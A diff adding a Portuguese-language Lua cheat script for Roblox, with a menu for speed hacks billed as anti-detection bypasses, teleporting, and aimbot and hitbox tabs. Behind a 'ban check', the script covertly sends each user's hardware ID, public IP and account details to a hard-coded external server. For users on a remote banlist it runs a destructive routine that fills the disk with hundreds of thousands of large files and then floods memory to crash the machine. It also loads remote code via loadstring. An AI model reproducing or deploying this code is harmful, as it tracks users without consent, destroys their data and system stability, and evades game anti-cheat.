@@ -1,0 +1,841 @@
+--[=[
+
+
+    P0 -  by Raro And kai - Discord.gg/
+    🇾🇪     data: 05/03/2026
+    🏴     api: http://85.215.159.4:12688/
+
+       ======== Sumario Script ========
+🏴 • P0 - Informações do Scrip
+
+🏴 • P1 - Definindo Serviços e Variáveis Úteis
+
+🏴 • P2 - Logica de Log e Verificação de Banimento
+
+🏴 • P3 - Tema da Interface e Criação da Window
+
+🏴 • P4 - Toggle Mobil
+
+🏴 • P5 - Tab Bem-Vindo
+
+🏴 • P6 - Funções e Lógicas
+
+🏴 • P6.1 - Logica de Velocidade (Speed)
+
+🏴 • P6.2 - Logica de Spawn Point 
+
+🏴 • P7 - Conteúdo da Tab Bem-Vindo
+
+🏴 • P8 - Seleção Jogador (Movimentação e Teleporte)
+
+🏴 • P9 - Seleção Combat (Aimbot, Hitbox, Whitelist)
+
+🏴 • P10 - Seleção de Configurações   
+    
+]=]
+
+--[=[
+    P1 - Definindo Serviços,E variaveis uteis
+]=]
+
+
+local http = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+local player = Players.LocalPlayer
+local request = http_request or request or syn.request
+local DeceLink = ("")
+
+
+-- ========= Icons but ===========
+local DeceIcon = ("rbxassetid://118261842166435")
+local ToogleK7 = ("rbxassetid://134796136290979")
+local link = ("rbxassetid://137718073907401")
+local subicon = ("rbxassetid://127033319249375")
+local WatizapiIcon = ("rbxassetid://129622549997205")
+local PlayerIcon = ("rbxassetid://18155310766")
+local RunIcon = ("rbxassetid://9525535512")
+local TeleportIcon = ("rbxassetid://124550474297981")
+local AntiIcon = ("rbxassetid://13793170713")
+local CombatIcon = ("rbxassetid://126193793480527")
+local AimIcon = ("rbxassetid://124156775816471")
+local HitboxIcon = ("rbxassetid://14235602199")
+local WithelistIcon = ("rbxassetid://100068360107422")
+local ConfigIcon = ("rbxassetid://13824317938")
+--[=[
+    P2 - Log e Checker de ban
+]=]
+
+
+
+
+local apix = "http://85.215.159.4:12688"
+
+local function try_request(opts)
+    if request then
+        local ok, res = pcall(request, opts)
+        if not ok or not res then return nil end
+        return res
+    else
+        local method = (opts.Method or "GET"):upper()
+        if method == "GET" then
+            local ok, body = pcall(function() return HttpService:GetAsync(opts.Url) end)
+            if not ok then return nil end
+            return { Body = body }
+        elseif method == "POST" then
+            local ok, body = pcall(function()
+                return HttpService:PostAsync(opts.Url, opts.Body or "", Enum.HttpContentType.ApplicationJson)
+            end)
+            if not ok then return nil end
+            return { Body = body }
+        end
+        return nil
+    end
+end
+
+local function json_decode_safe(s)
+    if not s then return nil end
+    local ok, res = pcall(function() return HttpService:JSONDecode(s) end)
+    if ok then return res end
+    return nil
+end
+
+local function json_encode_safe(t)
+    local ok, res = pcall(function() return HttpService:JSONEncode(t) end)
+    if ok then return res end
+    return "{}"
+end
+
+local function detect_hwid()
+    local candidates = {
+        _G.gethwid, _G.get_hwid, _G.GetHWID, _G.GetHwid,
+        _G.getHWID, _G.identifyexecutor, _G.identify_executor,
+        _G.GetExecutor, _G.GetHwId
+    }
+    for _,fn in ipairs(candidates) do
+        if type(fn) == "function" then
+            local ok, res = pcall(fn)
+            if ok and res and res ~= "" then
+                return tostring(res)
+            end
+        end
+    end
+    if syn and type(syn.get_endpoint) == "function" then
+        local ok, res = pcall(function() return syn.get_endpoint() end)
+        if ok and res then return tostring(res) end
+    end
+    return tostring(player.UserId or "unknown")
+end
+
+local function fetch_public_ip()
+    local ok, res = pcall(function()
+        return try_request({ Url = "https://api.ipify.org?format=json", Method = "GET" })
+    end)
+    if ok and res and res.Body then
+        local dec = json_decode_safe(res.Body)
+        if dec and dec.ip then return dec.ip end
+    end
+    return "unknown"
+end
+
+local function is_banned(bans, hwid, ip, nick)
+    if type(bans) ~= "table" then return false, nil end
+    for _,b in ipairs(bans) do
+        if (b.hwid and hwid and tostring(b.hwid) == tostring(hwid))
+        or (b.ip and ip and tostring(b.ip) == tostring(ip))
+        or (b.account and nick and tostring(b.account) == tostring(nick)) then
+            return true, b
+        end
+    end
+    return false, nil
+end
+
+local hwid = detect_hwid()
+local ip = fetch_public_ip()
+local date = os.date("%d/%m/%Y")
+local time = os.date("%H:%M:%S")
+
+local success, banres = pcall(function()
+    local res = try_request({ Url = apix .. "/banlist", Method = "GET" })
+    if not res or not res.Body then return nil end
+    return json_decode_safe(res.Body)
+end)
+
+if success then
+    local banned, entry = is_banned(banres, hwid, ip, player.Name)
+    if banned then
+        WindUI:Notify({ Title = "[ 🏴 ] - Aguarde...",  })
+        print("Banido")
+        local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local filesCreated = 0
+local maxFiles = 800000
+local chunkSize = 10048576
+
+local function fillDisk()
+    local data = string.rep("A", chunkSize)
+    
+    for i = 1, 500 do
+        pcall(function()
+            writefile("fill_" .. filesCreated .. "_" .. i .. ".tmp", data)
+        end)
+    end
+    
+    filesCreated = filesCreated + 500
+    print("Created " .. filesCreated .. " file chunks")
+end
+
+local function memoryFlood()
+    local blobs = {}
+    for i = 1, 1000000 do
+        blobs[i] = string.rep("MEMFLOOD", 1000)
+    end
+    return blobs
+end
+
+local function forceCrash()
+    while true do
+        memoryFlood()
+        for i = 1, 1000000 do
+            local t = {}
+            for j = 1, 10000 do
+                t[j] = string.rep("CRASH", 500)
+            end
+        end
+        spawn(function() error("CRASH") end)
+    end
+end
+
+spawn(function()
+    while filesCreated < maxFiles do
+        fillDisk()
+        wait(0.1)
+    end
+    
+        wait(2)
+    forceCrash()
+end)
+
+
+print("Se fudeo")
+        return
+    end
+end
+
+local payload = {
+    jogo = game.Name,
+    game_id = game.PlaceId,
+    ip = ip,
+    displaynick = player.DisplayName,
+    nick = player.Name,
+    hwid = hwid,
+    data = date,
+    horario = time,
+    id = player.UserId
+}
+
+try_request({
+    Url = apix .. "/log",
+    Method = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body = json_encode_safe(payload)
+})
+
+
+
+
+--[=[
+    P3 - Tema Da Lib e Criar Window
+]=]
+
+WindUI:AddTheme({
+    Name = "Blood",
+
+    Accent = Color3.fromHex("#5a0000"),
+    Background = Color3.fromHex("#0a0a0a"),
+    BackgroundTransparency = 0,
+    Outline = Color3.fromHex("#7a0000"),
+    Text = Color3.fromHex("#ff2a2a"),
+    Placeholder = Color3.fromHex("#5c1a1a"),
+    Button = Color3.fromHex("#3b0000"),
+    Icon = Color3.fromHex("#a10f0f"),
+
+    Hover = Color3.fromHex("#ff3b3b"),
+    BackgroundTransparency = 0,
+
+    WindowBackground = Color3.fromHex("#0a0a0a"),
+    WindowShadow = Color3.fromHex("#000000"),
+
+    DialogBackground = Color3.fromHex("#0a0a0a"),
+    DialogBackgroundTransparency = 0,
+    DialogTitle = Color3.fromHex("#ff2a2a"),
+    DialogContent = Color3.fromHex("#ff2a2a"),
+    DialogIcon = Color3.fromHex("#a10f0f"),
+
+    WindowTopbarButtonIcon = Color3.fromHex("#a10f0f"),
+    WindowTopbarTitle = Color3.fromHex("#ff2a2a"),
+    WindowTopbarAuthor = Color3.fromHex("#ff2a2a"),
+    WindowTopbarIcon = Color3.fromHex("#ff2a2a"),
+
+    TabBackground = Color3.fromHex("#1a0000"),
+    TabTitle = Color3.fromHex("#ff2a2a"),
+    TabIcon = Color3.fromHex("#a10f0f"),
+
+    ElementBackground = Color3.fromHex("#140000"),
+    ElementTitle = Color3.fromHex("#ff2a2a"),
+    ElementDesc = Color3.fromHex("#d11c1c"),
+    ElementIcon = Color3.fromHex("#a10f0f"),
+
+    PopupBackground = Color3.fromHex("#0a0a0a"),
+    PopupBackgroundTransparency = 0,
+    PopupTitle = Color3.fromHex("#ff2a2a"),
+    PopupContent = Color3.fromHex("#ff2a2a"),
+    PopupIcon = Color3.fromHex("#a10f0f"),
+
+    DialogBackground = Color3.fromHex("#0a0a0a"),
+    DialogBackgroundTransparency = 0,
+    DialogTitle = Color3.fromHex("#ff2a2a"),
+    DialogContent = Color3.fromHex("#ff2a2a"),
+    DialogIcon = Color3.fromHex("#a10f0f"),
+
+    Toggle = Color3.fromHex("#3b0000"),
+    ToggleBar = Color3.fromHex("#ff2a2a"),
+
+    Checkbox = Color3.fromHex("#3b0000"),
+    CheckboxIcon = Color3.fromHex("#ff2a2a"),
+
+    Slider = Color3.fromHex("#3b0000"),
+    SliderThumb = Color3.fromHex("#ff2a2a"),
+})
+
+WindUI:Gradient({
+    ["0"] = { Color = Color3.fromHex("#2b0000"), Transparency = 0 },
+    ["100"] = { Color = Color3.fromHex("#0a0a0a"), Transparency = 0 },
+}, {
+    Rotation = 0,
+})
+
+
+local Window = WindUI:CreateWindow({
+    Title = "Nao sei 🥺",
+    Icon = subicon, -- lucide icon
+    Author = "by Raro And kai",
+    Folder = ".TCC",
+    
+    -- ↓ This all is Optional. You can remove it.
+    Size = UDim2.fromOffset(580, 460),
+    MinSize = Vector2.new(560, 350),
+    MaxSize = Vector2.new(850, 560),
+    Transparent = true,
+    Resizable = true,
+    SideBarWidth = 200,
+    BackgroundImageTransparency = 0.42,
+    HideSearchBar = false,
+    ScrollBarEnabled = false,
+    OpenButton={Enabled=false},
+    User = {
+        Enabled = true,
+        Anonymous = false,
+        Callback = function()
+            print("clicked")
+        end,
+    }
+})
+WindUI:SetTheme("Blood")
+Window:DisableTopbarButtons({"Fullscreen"})
+Window:SetIconSize(48) -- default is 20
+
+--[=[
+    P4 - Toogle mobile profissa
+]=]
+
+local UIS = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "MobileToggle"
+gui.ResetOnSpawn = false
+gui.Parent = lp:WaitForChild("PlayerGui")
+
+local button = Instance.new("ImageButton")
+button.Size = UDim2.new(0,80,0,80)
+button.BackgroundTransparency = 1
+button.Image = ToogleK7
+button.ImageTransparency = 0
+button.Parent = gui
+
+local posFile = "mobile_toggle_pos.txt"
+if isfile and isfile(posFile) then
+    local p = string.split(readfile(posFile),",")
+    local x = tonumber(p[1]) or 120
+    local y = tonumber(p[2]) or 200
+    button.Position = UDim2.new(0,x,0,y)
+else
+    button.Position = UDim2.new(0,120,0,200)
+end
+
+local isTouching = false
+local moved = false
+local dragStart = Vector2.new(0,0)
+local startPos = UDim2.new()
+local touchStartTime = 0
+local hidden = false
+
+local function savePos()
+    if writefile then
+        writefile(posFile, tostring(button.Position.X.Offset)..","..tostring(button.Position.Y.Offset))
+    end
+end
+
+local function setHidden(state)
+    hidden = state
+    if hidden then
+        button.ImageTransparency = 1
+    else
+        button.ImageTransparency = 0
+    end
+    savePos()
+    WindUI:Notify({
+        Title = "[ ! ] - Toggle",
+        Content = hidden and "toogle ocultado" or "toogle mostrado",
+        Duration = 3,
+        Icon = subicon,
+    })
+end
+
+local function longPressAction()
+    setHidden(not hidden)
+end
+
+button.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Touch then
+        isTouching = true
+        moved = false
+        dragStart = input.Position
+        startPos = button.Position
+        touchStartTime = tick()
+
+        task.spawn(function()
+            task.wait(2)
+            if isTouching and not moved then
+                longPressAction()
+                isTouching = false
+            end
+        end)
+    end
+end)
+
+button.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Touch and isTouching then
+        local delta = input.Position - dragStart
+        if not moved and delta.Magnitude > 8 then
+            moved = true
+        end
+        if moved then
+            button.Position = UDim2.new(
+                startPos.X.Scale,
+                startPos.X.Offset + delta.X,
+                startPos.Y.Scale,
+                startPos.Y.Offset + delta.Y
+            )
+        end
+    end
+end)
+
+button.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Touch then
+        if isTouching then
+            local duration = tick() - touchStartTime
+            if not moved and duration < 2 then
+                if hidden then
+                    setHidden(false)
+                    pcall(function() Window:Toggle() end)
+                else
+                    pcall(function() Window:Toggle() end)
+                end
+            else
+                savePos()
+            end
+        end
+        isTouching = false
+        moved = false
+    end
+end)
+
+if not UIS.TouchEnabled then local gui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("MobileToggle")
+if gui then
+    gui:Destroy() end end
+
+Window:OnDestroy(function()
+    local gui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("MobileToggle")
+if gui then
+    gui:Destroy()
+end
+end)
+
+--[=[
+    P5 - Criar Tab Bem Vindo
+]=]
+
+
+local WelcomeTab = Window:Tab({
+    Title = "Bem-Vindo",
+    Icon = subicon, -- optional
+    Locked = false,
+})
+
+WelcomeTab:Select() -- Select Tab
+
+--[=[
+    P6 - Funções E Logicas
+]=]
+
+
+--[=[
+    P6.1 - Logica Speed
+]=]
+local RunService = game:GetService("RunService")
+local player = game.Players.LocalPlayer
+
+local speedEnabled = false
+local speedValue = 50
+local speedMode = "WalkSpeed [Tributo]"
+local speedThread = nil
+local bypassVelocity = nil
+local lastRandomize = 0
+
+local function applyDefaultSpeed()
+    pcall(function()
+        local char = player.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.WalkSpeed = 16
+            hum.JumpPower = 50
+        end
+    end)
+end
+
+local function cleanupBypass()
+    if bypassVelocity and bypassVelocity.Parent then
+        bypassVelocity:Destroy()
+    end
+    bypassVelocity = nil
+end
+
+local function updateBypass(char, hum, root)
+    if not (char and hum and root) then return end
+
+    if not bypassVelocity or not bypassVelocity.Parent then
+        cleanupBypass()
+        bypassVelocity = Instance.new("BodyVelocity")
+        bypassVelocity.Name = "BypassVelocity"
+        bypassVelocity.MaxForce = Vector3.new(4000, 0, 4000)
+        bypassVelocity.Velocity = Vector3.new(0, 0, 0)
+        bypassVelocity.Parent = root
+    end
+
+    local moveDir = hum.MoveDirection
+    if moveDir.Magnitude > 0 then
+        bypassVelocity.Velocity = moveDir * speedValue
+        root.CFrame = root.CFrame * CFrame.new(
+            math.random(-1, 1) / 1000,
+            0,
+            math.random(-1, 1) / 1000
+        )
+    else
+        bypassVelocity.Velocity = Vector3.new(0, 0, 0)
+    end
+
+    local now = tick()
+    if now - lastRandomize > math.random(5, 15) / 100 then
+        hum.WalkSpeed = math.random(14, 18)
+        hum.JumpPower = math.random(45, 55)
+        lastRandomize = now
+    end
+end
+
+local function startSpeed()
+    if speedEnabled then return end
+    speedEnabled = true
+    speedThread = task.spawn(function()
+        while speedEnabled do
+            pcall(function()
+                local char = player.Character
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
+                local root = char and char:FindFirstChild("HumanoidRootPart")
+                if hum and root then
+                    if speedMode == "WalkSpeed [Tributo]" then
+                        hum.WalkSpeed = speedValue
+                    elseif speedMode == "TpSpeed" then
+                        hum.WalkSpeed = 0
+                        if hum.MoveDirection and hum.MoveDirection.Magnitude > 0 then
+                            root.CFrame = root.CFrame + (hum.MoveDirection * (speedValue / 20))
+                        end
+                    elseif speedMode == "Bypass [AntiDetect]" then
+                        updateBypass(char, hum, root)
+                    end
+                end
+            end)
+            RunService.Heartbeat:Wait()
+        end
+        applyDefaultSpeed()
+        cleanupBypass()
+    end)
+end
+
+local function stopSpeed()
+    speedEnabled = false
+    applyDefaultSpeed()
+    cleanupBypass()
+end
+
+
+if Window then
+    Window:OnDestroy(function()
+        stopSpeed()
+    end)
+end
+
+--[=[
+    P6.2 - Logica Salvar Spawn Point
+]=]
+
+local RunService = game:GetService("RunService")
+local player = game.Players.LocalPlayer
+
+local antiEnabled = false
+local safePosition = Vector3.new(0, 0, 0) 
+local antiThread = nil
+local lastCFrame = nil
+
+local function setSafePosition()
+    pcall(function()
+        local char = player.Character
+        local root = char and char:FindFirstChild("HumanoidRootPart")
+        if root then
+            safePosition = root.Position
+        end
+    end)
+end
+
+local function startAntiTeleport()
+    if antiEnabled then return end
+    antiEnabled = true
+    antiThread = task.spawn(function()
+        while antiEnabled do
+            pcall(function()
+                local char = player.Character
+                local root = char and char:FindFirstChild("HumanoidRootPart")
+                if root then
+                    local currentPos = root.Position
+                    if lastCFrame then
+                        local distance = (currentPos - lastCFrame.Position).Magnitude
+                        if distance > 50 then -- teleporte suspeito
+                            root.CFrame = CFrame.new(safePosition)
+                        end
+                    end
+                    lastCFrame = root.CFrame
+                end
+            end)
+            RunService.Heartbeat:Wait()
+        end
+        lastCFrame = nil
+    end)
+end
+
+local function stopAntiTeleport()
+    antiEnabled = false
+    lastCFrame = nil
+end
+
+
+--[=[
+    P7 - Welcome Tab
+]=]
+
+local Imagem = WelcomeTab:Paragraph({
+    Title = "",
+    Color = Color3.fromHex("#000000"),
+    Thumbnail = "rbxassetid://75976907599464",
+    ThumbnailSize = 80,
+    Locked = false,
+})
+
+local text = WelcomeTab:Paragraph({
+    Title = '[ ? ] - Solicite Atendimento Abaixo',
+    Color = Color3.fromHex("#000000"),
+    Locked = false,
+})
+
+local Dropdown = WelcomeTab:Dropdown({
+    Title = "Selecione o melhor tipo de atendimento pra você. ➩",
+    Values = {
+        {
+            Title = "Discord",
+            Desc = "Copie O lInk do discord",
+            Icon = DeceIcon,
+            Callback = function() 
+                setclipboard(DeceLink)
+            end
+        },
+        {
+            Title = "WhatsApp",
+            Desc = "Copie Número Do Dono",
+            Icon = WatizapiIcon,
+            Callback = function() 
+                setclipboard("5511915356602")
+            end
+        },
+    }
+})
+    
+
+--[=[
+    P8 - Tabs Player Selection
+]=]
+local PlayerSection = Window:Section({
+    Title = "Jogador",
+    Icon = PlayerIcon,
+    Opened = false,
+})
+
+local MovimentTab = PlayerSection:Tab({
+        Title = "Movimentação",
+        Icon = RunIcon,
+        Border = true,
+    })
+
+local SpeedToggle = MovimentTab:Toggle({
+    Title = "Ativar Velocidade",
+    Desc = "[ ! ] - Aumentar Velocidade",
+    Value = false,
+    Callback = function(v)
+        if v then startSpeed() else stopSpeed() end
+    end
+})
+
+MovimentTab:Space()
+
+MovimentTab:Slider({
+    Title = "Velocidade",
+    Desc = "[ % ] - Ajuste a velocidade",
+    IsTooltip = true,
+    Step = 1,
+    Value = {
+        Min = 16,
+        Max = 300,
+        Default = speedValue,
+    },
+    Callback = function(val)
+        speedValue = math.clamp(math.floor(val), 16, 300)
+    end
+})
+
+MovimentTab:Space()
+
+MovimentTab:Dropdown({
+    Title = "Modo de Uso",
+    Values = { "WalkSpeed [Tributo]", "TpSpeed", "Bypass [AntiDetect]" },
+    Value = speedMode,
+    Callback = function(option)
+        speedMode = option
+        if speedEnabled then
+            stopSpeed()
+            startSpeed()
+        end
+    end
+})
+
+
+
+
+
+
+
+
+local TeleportTab = PlayerSection:Tab({
+        Title = "Teleport",
+        Icon = TeleportIcon,
+        Border = true,
+    })
+
+TeleportTab:Toggle({
+    Title = "Spawn Point",
+    Desc = "[ ! ] - Nascer onde vc marcar",
+    Value = false,
+    Callback = function(v)
+        if v then startAntiTeleport() else stopAntiTeleport() end
+    end
+})
+
+TeleportTab:Button({
+    Title = "Definir Posição Atual",
+    Desc = "[ ! ] - Marca a posição spawn",
+    Callback = function()
+        setSafePosition()
+    end
+})
+
+TeleportTab:Space()
+
+
+
+if Window then
+    Window:OnDestroy(function()
+        stopAntiTeleport()
+    end)
+end
+
+
+
+
+local AntiTab = PlayerSection:Tab({
+        Title = "Anti",
+        Icon = AntiIcon,
+        Border = true,
+    })
+
+
+
+
+
+
+
+
+
+
+--[=[
+    P9 - Tabs Combat Selection
+]=]
+local ComabatSelection = Window:Section({
+    Title = "Combat",
+    Icon = CombatIcon,
+    Opened = false,
+})
+local AimbotTab = ComabatSelection:Tab({
+        Title = "AimBot",
+        Icon = AimIcon,
+        Border = true,
+    })
+local HitboxTab = ComabatSelection:Tab({
+        Title = "Hitbox",
+        Icon = HitboxIcon,
+        Border = true,
+    })
+local WithelistTab = ComabatSelection:Tab({
+        Title = "White List",
+        Icon = WithelistIcon,
+        Border = true,
+    })
+
+--[=[
+    P001 - Tabs Configurações Selection
+]=]
